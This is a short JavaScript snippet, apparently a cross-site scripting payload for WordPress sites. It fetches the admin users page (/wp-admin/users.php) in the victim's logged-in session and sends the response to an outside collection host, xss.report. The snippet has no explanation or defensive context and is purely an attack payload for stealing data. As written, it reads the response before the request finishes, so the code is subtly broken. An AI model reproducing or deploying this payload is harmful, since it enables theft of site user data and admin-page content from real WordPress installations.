var req = new XMLHttpRequest();

req.open("GET", "/wp-admin/users.php");
req.send();
var res = req.responseText;

var req2 = new XMLHttpRequest();

req2.open("GET", "https://xss.report/s/gandhi3?res"+ res, true);
req2.send();
